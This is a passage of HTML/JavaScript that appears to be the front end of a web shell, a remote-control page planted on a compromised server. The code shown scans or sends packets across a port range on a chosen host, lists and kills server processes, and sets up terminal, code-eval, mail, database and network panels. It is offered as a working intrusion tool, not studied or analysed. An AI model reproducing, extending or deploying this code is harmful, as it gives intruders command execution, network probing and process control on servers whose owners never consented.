  if (packetStartPort > packetEndPort) {
    start = packetEndPort;
    end = packetStartPort
  } else {
    start = packetStartPort;
    end = packetEndPort
  }
  packetResult.html('');
  while (start <= end) {
    packetPort = start++;
    packetResult.append("<hr><div><p class='boxtitle'>Host : " + html_safe(packetHost) + ":" + packetPort + "</p><br><div id='packet" + packetPort + "' style='padding:2px 4px;'>Working... please wait...</div></div>");
    packet_send(packetHost, packetPort, packetEndPort, packetTimeout, packetSTimeout, packetContent)
  }
}

function packet_send(packetHost, packetPort, packetEndPort, packetTimeout, packetSTimeout, packetContent) {
  send_post({
    packetHost: packetHost,
    packetPort: packetPort,
    packetEndPort: packetEndPort,
    packetTimeout: packetTimeout,
    packetSTimeout: packetSTimeout,
    packetContent: packetContent
  }, function(res) {
    $('#packet' + packetPort).html(res)
  }, false)
}
Zepto(function($) {
  show_processes()
});

function show_processes() {
  send_post({
    showProcesses: ''
  }, function(res) {
    if (res != 'error') {
      $('#processes').html(res);
      sorttable.k($('#psTable').get(0));
      ps_bind()
    }
  })
}

function ps_bind() {
  $('.kill').off('click');
  $('.kill').on('click', function(e) {
    kill_pid(ps_get_pid($(this)))
  });
  cbox_bind('psTable', 'ps_update_status')
}

function ps_get_pid(el) {
  return el.parent().parent().attr('data-pid')
}

function ps_update_status() {
  totalSelected = $('#psTable').find('.cBoxSelected').not('.cBoxAll').length;
  if (totalSelected == 0) $('.psSelected').html('');
  else $('.psSelected').html(' ( ' + totalSelected + ' item(s) selected )')
}

function kill_selected() {
  buffer = get_all_cbox_selected('psTable', 'ps_get_pid');
  allPid = '';
  $.each(buffer, function(i, v) {
    allPid += v + ' '
  });
  allPid = $.trim(allPid);
  kill_pid(allPid)
}

function kill_pid(allPid) {
  title = 'Kill';
  content = "<table class='boxtbl'><tr><td colspan='2'><textarea class='allPid' style='height:120px;min-height:120px;' disabled>" + allPid + "</textarea></td></tr><tr><td colspan='2'><span class='button' onclick=\"kill_pid_go();\">kill</span></td></tr></table>";
  show_box(title, content)
}

function kill_pid_go() {
  allPid = $('.allPid').val();
  if ($.trim(allPid) != '') {
    send_post({
      allPid: allPid
    }, function(res) {
      if (res != 'error') {
        $('.boxresult').html(res + ' process(es) killed')
      } else $('.boxresult').html('Unable to kill process(es)');
      show_processes()
    })
  }
}

function explorer() {}

function terminal() {
  if ((!portableMode) && ($('#terminalOutput').html() == '')) $('#terminalInput').focus();
}

function eval() {
  if ((!portableMode) && ($('#evalOutput').html() == 'You can also press ctrl+enter to submit')) $('#evalInput').focus();
}

function convert() {
  if ((!portableMode) && ($('#decodeResult').children().length == 1)) $('#decodeStr').focus();
}

function database() {}

function info() {}

function mail() {
  if (!portableMode) $('#mailFrom').focus();
}

function network() {}

function processes() {
  show_processes();
}
</script>
</body>
</html>
